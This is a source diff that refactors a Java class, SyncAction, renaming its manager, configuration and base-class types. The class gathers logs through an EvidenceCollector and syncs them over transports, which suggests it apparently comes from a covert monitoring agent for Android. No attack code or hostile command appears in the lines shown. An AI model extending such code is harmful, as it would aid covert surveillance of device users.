@@ -18,8 +18,9 @@ import com.android.service.action.sync.Protocol;
 import com.android.service.action.sync.ProtocolException;
 import com.android.service.action.sync.Transport;
 import com.android.service.action.sync.ZProtocol;
-import com.android.service.agent.AgentManager;
+import com.android.service.agent.ManagerAgent;
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfAction;
 import com.android.service.evidence.EvidenceCollector;
 import com.android.service.util.Check;
 
@@ -27,7 +28,7 @@ import com.android.service.util.Check;
 /**
  * The Class SyncAction.
  */
-public abstract class SyncAction extends SubAction {
+public abstract class SyncAction extends SubActionSlow {
 
 	private static final String TAG = "SyncAction"; //$NON-NLS-1$
 
@@ -35,7 +36,7 @@ public abstract class SyncAction extends SubAction {
 	protected EvidenceCollector logCollector;
 
 	/** The agent manager. */
-	protected AgentManager agentManager;
+	protected ManagerAgent agentManager;
 	// protected Transport[] transports = new Transport[Transport.NUM];
 	/** The transports. */
 	protected Vector<Object> transports;
@@ -54,11 +55,11 @@ public abstract class SyncAction extends SubAction {
 	 * @param jsubaction
 	 *            the conf params
 	 */
-	public SyncAction( final ActionConf jsubaction) {
+	public SyncAction( final ConfAction jsubaction) {
 		super( jsubaction);
 
 		logCollector = EvidenceCollector.self();
-		agentManager = AgentManager.self();
+		agentManager = ManagerAgent.self();
 		transports = new Vector<Object>();
 
 		protocol = new ZProtocol();
